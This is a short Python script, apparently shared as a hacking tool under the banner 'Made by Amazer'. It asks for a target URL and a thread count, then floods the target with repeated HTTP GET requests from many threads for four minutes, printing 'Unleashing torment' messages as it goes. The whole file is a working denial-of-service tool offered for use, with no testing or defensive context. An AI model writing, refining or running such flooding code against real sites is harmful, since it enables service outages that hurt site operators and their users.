import os
import requests
import threading
import time

def logo():
    os.system("clear")
    print("\033[01;33m\n\n\033[01;31m      _\033[01;33m ____    _\n     \033[01;31m(_)\033[01;33m   \n   ___________   ________   ___   __  __             __            \n  / ____/  _/ | / / ____/  /   | / /_/ /_____ ______/ /_____  _____\n / /_   / //  |/ / __/    / /| |/ __/ __/ __ `/ ___/ //_/ _ \\/ ___/\n/ __/ _/ // /|  / /___   / ___ / /_/ /_/ /_/ / /__/ ,< /  __/ /    \n/_/   /___/_/ |_/_____/  /_/  |_\\__/\__/\__,_/\\___/_/|_|\\___/_/  Made by Amazer Credit - cyber boy, Amazer and SKOP    \n                                                                                   \n                                                                                   \n")
    target_url = input("Enter the target URL: ")
    threads = int(input("Enter the number of threads: "))
    duration_minutes = 4

    def prolonged_attack():
        end_time = time.time() + (60 * duration_minutes)
        while time.time() < end_time:
            try:
                response = requests.get(target_url)
                print(f"Unleashing torment on {target_url} - Status code: {response.status_code}")
            except Exception as e:
                print(f"An error occurred: {e}")
                pass

    for _ in range(threads):
        daemon_thread = threading.Thread(target=prolonged_attack)
        daemon_thread.start()

logo()
